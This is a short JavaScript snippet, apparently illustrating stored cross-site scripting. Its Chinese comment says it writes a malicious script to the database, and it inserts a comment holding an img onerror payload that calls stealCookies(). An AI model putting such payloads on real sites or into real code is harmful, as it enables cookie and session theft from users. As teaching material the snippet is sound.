// 将恶意脚本写入数据库
const userComment = `<img src=x onerror="stealCookies()">`;
db.comments.insert({ content: userComment });